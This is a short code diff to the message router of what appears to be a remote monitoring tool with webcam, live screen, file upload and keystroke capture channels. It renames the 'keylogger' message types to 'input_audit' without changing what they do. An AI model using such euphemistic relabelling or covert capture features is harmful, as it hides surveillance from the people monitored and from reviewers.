@@ -50,9 +50,9 @@ _WEBAPP_ALLOWED_TYPES: frozenset[str] = frozenset({
     # Webcam
     "webcam.start",
     "webcam.stop",
-    # Keylogger
-    "keylogger.start",
-    "keylogger.stop",
+    # Input Audit Log
+    "input_audit.start",
+    "input_audit.stop",
     # File
     "file.list",
     "file.upload",
@@ -78,7 +78,7 @@ _CLIENT_ALLOWED_TYPES: frozenset[str] = frozenset({
     "heartbeat",
     "screen.live.frame",
     "webcam.frame",
-    "keylogger.data",
+    "input_audit.data",
     "permission.response",
 })
 
@@ -266,7 +266,7 @@ async def route_from_client(
     if msg_type in ("response", "error") and command_tracker is not None:
         command_tracker.resolve(machine_id)
 
-    # response / error / frame / keylogger.data — forward lên Web App
+    # response / error / frame / input_audit.data — forward lên Web App
     forward_message = {**message, "source": machine_id, "destination": "webapp"}
     sent = await manager.send_to_webapp(forward_message)
     if not sent:
